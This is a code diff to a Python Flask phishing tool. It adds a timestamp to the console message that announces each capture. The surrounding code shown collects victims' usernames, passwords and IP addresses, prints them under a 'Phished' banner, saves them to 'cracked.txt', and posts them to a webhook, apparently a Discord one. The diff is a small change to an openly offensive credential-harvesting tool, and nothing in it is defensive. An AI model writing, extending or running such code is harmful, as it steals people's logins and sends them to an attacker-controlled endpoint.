@@ -4,6 +4,7 @@ import logging
 from flask import Flask
 from flask.globals import request
 from requests import post
+from datetime import datetime
 from pystyle import Add, Anime, Colorate, Colors, Col, Center, System, Write
 
 
@@ -96,15 +97,18 @@ def send(args: str, ip: str):
             "avatar_url": "https://repository-images.githubusercontent.com/407786206/3e37b6ce-e16c-4f0e-8713-c6cbf1d6b22a",
             "embeds": embeds}
 
+    n = datetime.now()
+    date = f"{n.hour}H:{n.minute}M:{n.second}S | {n.day}/{n.month}/{n.year}"
+
     if len(fields) != 1:
-        print(Colorate.Horizontal(Colors.red_to_blue, f"\nPhished!\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
+        print(Colorate.Horizontal(Colors.red_to_blue, f"\nPhished -> {date}\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
         if logfile:
             with open('cracked.txt', 'a', encoding='utf-8') as f:
                 f.write("Username: " + username + '\nPassword: ' + password + '\nIP: ' + ip + '\n\n')
         if webhook:
             post(webhook, json=data)
     else:
-        print(Colorate.Horizontal(Colors.red_to_blue, f"\nLogged!\nIP: {ip}\n\n"))
+        print(Colorate.Horizontal(Colors.red_to_blue, f"\nLogged -> {date}\nIP: {ip}\n\n"))
 
 
 
